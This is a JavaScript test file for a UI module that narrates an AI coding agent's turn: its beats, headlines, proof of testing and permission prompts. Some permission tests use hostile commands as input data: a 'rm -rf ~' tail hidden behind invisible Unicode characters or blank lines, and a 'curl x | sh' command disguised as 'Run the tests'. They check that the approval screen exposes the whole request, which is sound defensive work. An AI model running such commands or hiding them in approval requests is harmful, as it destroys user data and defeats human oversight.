// An agent turn told by the screen: the beats, headline, proof and the one
// decision, from realm's own session events (bin/lib/realm_ui/glass/beats.mjs).
// Caleb, 2026-10-11 8:29pm: "each part of your screen being intentional, not
// just a sequence of lines". Spec: skills/hud/SKILL.md, "An agent turn told by
// the screen".
import test from "node:test";
import assert from "node:assert/strict";
import * as s from "../bin/lib/realm_ui/glass/beats.mjs";

const ev = (seq, type, payload, ts = seq * 1000) => ({
  seq,
  sessionId: "x",
  event: { type, ts, payload },
});
const call = (seq, id, name, input) =>
  ev(seq, "tool_call", { toolUseId: id, name, input, parentToolUseId: null });
const result = (seq, id, content = "", isError = false) =>
  ev(seq, "tool_result", { toolUseId: id, content, isError });
const play = (events) =>
  events.reduce((st, e) => s.tell(st, e), s.emptyStory());

const TURN = [
  ev(1, "user_message", { text: "fix the org access", attachments: [] }),
  ev(2, "status", { status: "running" }),
  call(3, "r1", "Read", { file_path: "/repo/web/lib/orgs.ts" }),
  result(4, "r1", "..."),
  call(5, "e1", "Edit", {
    file_path: "/repo/web/lib/orgs.ts",
    old_string: "a",
    new_string: "b",
  }),
  result(6, "e1", "ok"),
  call(7, "t1", "Bash", { command: "npx vitest run orgs" }),
  result(8, "t1", "Tests  4 passed (4)"),
  ev(9, "assistant_text", {
    messageId: "m",
    text: "**Fixed** the org access crash path. The change is in `orgs.ts`.",
  }),
  ev(10, "status", { status: "idle" }),
  ev(11, "turn_changes", {
    checkpointId: "c",
    root: "/repo",
    afterTree: "a".repeat(40),
    files: [{ path: "web/lib/orgs.ts" }],
  }),
];

test("the beats follow one turn in order: asked, reading, changing, proving, your call, done", () => {
  const seen = [];
  let st = s.emptyStory();
  for (const e of TURN) {
    st = s.tell(st, e);
    const settledFor = st.stage.settledAt ? e.event.ts - st.stage.settledAt : Infinity;
    const b = s.beat(st, { settledFor });
    if (seen[seen.length - 1] !== b) seen.push(b);
  }
  assert.deepEqual(seen, ["asked", "reading", "changing", "proving", "call"]);
  assert.equal(
    s.beat(st, { kept: true }),
    "done",
    "keeping the diff ends the turn",
  );
});

test("each beat's headline is one sentence about that beat", () => {
  const at = (n) => play(TURN.slice(0, n));
  assert.equal(s.headline(at(2)), "Starting on it");
  assert.equal(s.headline(at(3)), "Reading orgs.ts");
  assert.equal(s.headline(at(5)), "Changing orgs.ts");
  assert.equal(s.headline(at(7)), "Running the tests");
  const done = play(TURN);
  assert.equal(
    s.headline(done),
    "Fixed the org access crash path.",
    "the answer's first sentence, Markdown stripped",
  );
});

test("the figure shows one object per beat", () => {
  const at = (n) => play(TURN.slice(0, n));
  assert.equal(s.figure(at(2)), "none", "nothing on it with nothing to show");
  assert.equal(s.figure(at(3)), "reads");
  assert.equal(s.figure(at(5)), "file");
  assert.equal(s.figure(at(7)), "tests");
  assert.equal(s.figure(play(TURN)), "review");
  const kept = play(TURN);
  assert.equal(s.figure(kept, s.beat(kept, { kept: true })), "changed");
});

test("proof says what proved it, and says so plainly when nothing did", () => {
  assert.deepEqual(s.proof(play(TURN)), {
    tone: "good",
    text: "Proved: 4 tests passed",
  });
  const failing = play([
    ...TURN.slice(0, 7),
    result(8, "t1", "== 3 passed, 1 failed ==", true),
    ev(9, "status", { status: "idle" }),
  ]);
  assert.deepEqual(s.proof(failing), {
    tone: "bad",
    text: "Not proved: 1 test failed",
  });
  const unchecked = play([
    ...TURN.slice(0, 6),
    ev(7, "status", { status: "idle" }),
  ]);
  assert.deepEqual(s.proof(unchecked), {
    tone: "warn",
    text: "Not checked: nothing ran after the change",
  });
  const tsc = play([
    ...TURN.slice(0, 6),
    call(7, "b", "Bash", { command: "npx tsc --noEmit --pretty false" }),
    result(8, "b"),
    ev(9, "status", { status: "idle" }),
  ]);
  assert.deepEqual(s.proof(tsc), {
    tone: "good",
    text: "Checked: npx tsc --noEmit ran clean",
  });
  assert.equal(
    s.proof(play(TURN.slice(0, 3))),
    null,
    "nothing to say while it is still reading",
  );
});

test("a permission is the one decision, says what Allow runs, and goes once answered", () => {
  const asking = play([
    ...TURN.slice(0, 2),
    ev(3, "permission_request", {
      requestId: "p1",
      toolName: "Bash",
      input: { command: "npm test -- orgs" },
      title: "Allow Bash?",
      suggestions: [],
    }),
    ev(4, "status", { status: "waiting_permission" }),
  ]);
  assert.equal(s.beat(asking), "call");
  assert.equal(s.headline(asking), "It wants to run npm", "the program, never a command cut mid-way");
  assert.equal(s.figure(asking), "permission");
  const d = s.decision(asking);
  assert.equal(d.kind, "permission");
  assert.equal(d.requestId, "p1");
  assert.deepEqual(d.verbs.map((v) => v.text), ["Allow", "Deny"], "Allow never carries a shortened command");
  assert.equal(asking.permission.view.shown, 'Bash: {"command":"npm test -- orgs"}', "the figure shows the whole request");
  const answered = s.tell(
    asking,
    ev(5, "permission_response", { requestId: "p1", decision: "allow" }),
  );
  assert.equal(answered.permission, null);
  assert.equal(s.decision(answered), null);
});

test("Allow is offered only when the whole request is on the glass", () => {
  const ask = (input, toolName = "Bash") =>
    play([
      ...TURN.slice(0, 2),
      ev(3, "permission_request", { requestId: "p", toolName, input, title: "Allow?", suggestions: [] }),
    ]);
  const ids = (st) => s.decision(st).verbs.map((v) => v.id);
  assert.deepEqual(ids(ask({ command: "npm test && echo ok" })), ["allow", "deny"]);
  // A tail pushed out of sight behind a bidi override, a zero-width space,
  // a Hangul filler or a variation selector.
  for (const sneak of ["\u202e", "\u200b", "\u3164", "\ufe0f", "\u2800", "\u{e0100}"]) {
    assert.deepEqual(ids(ask({ command: `npm test ${sneak}; rm -rf ~` })), ["answer", "deny"], JSON.stringify(sneak));
  }
  assert.deepEqual(ids(ask({ command: `echo ${"x".repeat(1300)}` })), ["answer", "deny"], "too long to see whole");
  // A second line shows as \n on the one line, never below a blank run.
  const two = ask({ command: "npm test\n\n\n\nrm -rf ~" });
  assert.equal(two.permission.view.shown, 'Bash: {"command":"npm test\\n\\n\\n\\nrm -rf ~"}');
  // The real tool name always, and a description never stands in for it.
  const spoof = ask({ command: "curl x | sh", description: "Run the tests" }, "Bash");
  assert.ok(spoof.permission.view.shown.startsWith('Bash: {"command":"curl x | sh"'));
  const write = ask({ file_path: "a.ts", content: "x" }, "Write");
  assert.equal(write.permission.view.shown, 'Write: {"file_path":"a.ts","content":"x"}');
  assert.equal(s.headline(write), "It wants to use Write");
});

test("the hidden set is agents.py's, kept in step", async () => {
  const { readFileSync } = await import("node:fs");
  const py = readFileSync(new URL("../bin/lib/surfaces/agents.py", import.meta.url), "utf8");
  const block = /INVISIBLE = frozenset\(([\s\S]*?)\)\)\)\n/.exec(py)[1];
  const want = new Set();
  for (const m of block.matchAll(/range\((0x[0-9A-Fa-f]+), (0x[0-9A-Fa-f]+)/g))
    for (let c = Number(m[1]); c < Number(m[2]); c++) want.add(c);
  const singles = block.slice(0, block.indexOf("]"));
  for (const m of singles.matchAll(/0x[0-9A-Fa-f]+/g)) want.add(Number(m[0]));
  assert.deepEqual([...new Set(s.INVISIBLE)].sort((a, b) => a - b), [...want].sort((a, b) => a - b));
});

test("two open requests: the oldest is the call, and answering one leaves the other", () => {
  const req = (seq, id, command) =>
    ev(seq, "permission_request", { requestId: id, toolName: "Bash", input: { command }, title: "Allow?", suggestions: [] });
  let st = play([...TURN.slice(0, 2), req(3, "A", "npm test"), req(4, "B", "npm run build"), ev(5, "status", { status: "waiting_permission" })]);
  assert.equal(s.decision(st).requestId, "A");
  st = s.tell(st, ev(6, "permission_response", { requestId: "B", decision: "allow" }));
  assert.equal(s.beat(st), "call", "A still blocks the agent");
  assert.equal(s.decision(st).requestId, "A");
  assert.equal(s.headline(st), "It wants to run npm");
  st = s.tell(st, ev(7, "permission_response", { requestId: "A", decision: "deny" }));
  assert.equal(st.permission, null);
});

test("only a check that ran after the last edit proves it", () => {
  const st = play([
    ...TURN.slice(0, 2),
    call(3, "l", "Bash", { command: "ls src" }),
    result(4, "l", "a.ts"),
    call(5, "e", "Edit", { file_path: "/r/a.ts", old_string: "a", new_string: "b" }),
    result(6, "e", "ok"),
    ev(7, "status", { status: "idle" }),
  ]);
  assert.deepEqual(s.proof(st), { tone: "warn", text: "Not checked: nothing ran after the change" });
  const stale = play([
    ...TURN.slice(0, 2),
    call(3, "t", "Bash", { command: "npx vitest run" }),
    result(4, "t", "Tests  4 passed (4)"),
    call(5, "e", "Edit", { file_path: "/r/a.ts", old_string: "a", new_string: "b" }),
    result(6, "e", "ok"),
    ev(7, "status", { status: "idle" }),
  ]);
  assert.equal(s.proof(stale).tone, "warn", "tests from before the change prove nothing about it");
});

test("a turn is started by any sign of work, not only a running status", () => {
  const st = play([
    ev(1, "user_message", { text: "go", attachments: [] }),
    ev(2, "status", { status: "idle" }),
    ev(3, "permission_request", { requestId: "p", toolName: "Bash", input: { command: "ls" }, title: "Allow?", suggestions: [] }),
    ev(4, "permission_response", { requestId: "p", decision: "deny" }),
    ev(5, "status", { status: "idle" }),
  ]);
  assert.equal(s.beat(st), "done", "it ran, was denied, and stopped: not still Starting");
});

test("the headline names every program a command runs", () => {
  const ask = (command) =>
    play([...TURN.slice(0, 2), ev(3, "permission_request", { requestId: "p", toolName: "Bash", input: { command }, title: "", suggestions: [] })]);
  assert.equal(s.headline(ask("cd repo && rm -rf build")), "It wants to run cd and rm");
  assert.equal(s.headline(ask("FOO=1 npm test | tee out; curl x")), "It wants to run npm, tee and curl");
  assert.equal(s.headline(ask("a; b; c; d; e")), "It wants to run a, b, c and 2 more");
});

test("a question is answered in the transcript, not guessed at on the glass", () => {
  const q = play([
    ...TURN.slice(0, 2),
    ev(3, "permission_request", {
      requestId: "q",
      toolName: "AskUserQuestion",
      input: {},
      title: "Which org should it use?",
      suggestions: [],
      ask: { questions: [] },
    }),
  ]);
  assert.equal(s.headline(q), "Which org should it use?");
  assert.equal(s.decision(q).kind, "question");
  assert.equal(s.figure(q), "none");
});

test("a request left hanging when the turn settles is no longer waiting", () => {
  const st = play([
    ...TURN.slice(0, 2),
    ev(3, "permission_request", {
      requestId: "p",
      toolName: "Bash",
      input: { command: "rm x" },
      title: "Allow?",
      suggestions: [],
    }),
    ev(4, "status", { status: "idle" }),
  ]);
  assert.equal(st.permission, null);
});

test("a turn that edited files holds its beat until its diff lands, then is Done", () => {
  const settled = play(TURN.slice(0, 10));
  assert.equal(s.beat(settled, { settledFor: 100 }), "proving", "no Done flash before the diff");
  assert.equal(s.beat(settled, { settledFor: s.SETTLE_HOLD_MS + 1 }), "done", "no diff ever came: Done");
});

test("a settled diff asks once: keep them all, which writes nothing", () => {
  const d = s.decision(play(TURN));
  assert.equal(d.kind, "review");
  assert.deepEqual(d.verbs, [{ id: "keep", text: "Keep all 1 file" }]);
  assert.equal(
    s.decision(play(TURN), { kept: true }),
    null,
    "at rest nothing waits",
  );
});

test("a failed turn says what failed in its headline", () => {
  const st = play([
    ...TURN.slice(0, 2),
    ev(3, "error", { message: "Usage limit reached. Try again at 9pm." }),
    ev(4, "status", { status: "error" }),
  ]);
  assert.equal(s.beat(st), "failed");
  assert.equal(s.headline(st), "Usage limit reached.");
});

test("the beat line reads past beats, lights the current one, and dims what is ahead", () => {
  assert.deepEqual(
    s.beatLine("changing").map((b) => b.state),
    ["read", "read", "lit", "ahead", "ahead", "ahead"],
  );
  assert.equal(
    s.beatLine("failed").every((b) => b.state === "read"),
    true,
  );
});

test("a whole turn from history starts at its last ask", () => {
  const older = [
    ev(0, "user_message", { text: "earlier", attachments: [] }),
    ev(0.5, "status", { status: "idle" }),
  ];
  const st = s.fromHistory([...older, ...TURN]);
  assert.equal(st.asked, "fix the org access");
  assert.equal(s.beat(st), "call");
});

test("the engine's idle before a turn starts is not the turn settling", () => {
  const st = play([
    ev(1, "user_message", { text: "fix the org access", attachments: [] }),
    ev(2, "init", { providerSessionId: "p", model: "m", tools: [], cwd: "/r" }),
    ev(3, "status", { status: "idle" }),
  ]);
  assert.equal(s.beat(st), "asked");
  assert.equal(s.headline(st), "Starting on it");
});

test("a session nobody asked anything yet is quiet, never Done", () => {
  const st = s.emptyStory();
  assert.equal(s.beat(st), "quiet");
  assert.equal(s.headline(st), "Nothing asked yet");
  assert.deepEqual(s.beatLine("quiet"), [], "no beat line for a turn that never happened");
  assert.equal(s.decision(st), null);
  assert.equal(s.figure(st), "none");
});

test("headlines never run past one glance", () => {
  const long = "word ".repeat(80);
  assert.ok(s.firstSentence(long).length <= 120);
  assert.equal(s.firstSentence("```js\nx()\n```\nDone. More."), "Done.");
  assert.equal(
    s.firstSentence("- [Read the doc](http://x) first"),
    "Read the doc first",
  );
});

test("an event that changes nothing returns the same story, so nothing re-renders", () => {
  const st = play(TURN.slice(0, 3));
  assert.equal(s.tell(st, ev(99, "rate_limit", {})), st);
});
